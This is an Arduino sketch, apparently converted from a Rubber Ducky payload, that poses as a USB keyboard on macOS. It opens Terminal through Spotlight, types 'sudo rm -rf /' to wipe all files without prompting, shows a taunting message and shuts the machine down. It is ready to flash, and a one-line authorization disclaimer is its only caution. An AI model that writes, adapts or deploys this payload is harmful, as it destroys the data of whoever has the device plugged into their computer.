// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // this will delete all files on the system
  // there will be no Prompt
  // Using such scripts can have severe consequences and is not recommended.
  // Always exercise caution and ensure you have proper authorization.
  // Title: Fuck your Files
  // Author: NARSTY
  // Version: 1.0
  // Target: macOS
  // Category: Executions
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo \"Hello! Initiating system takeover... Deleting All Files.....\"");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo rm -rf /");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo \"All your files have been deleted. Goodbye!\"");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo shutdown -h now");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}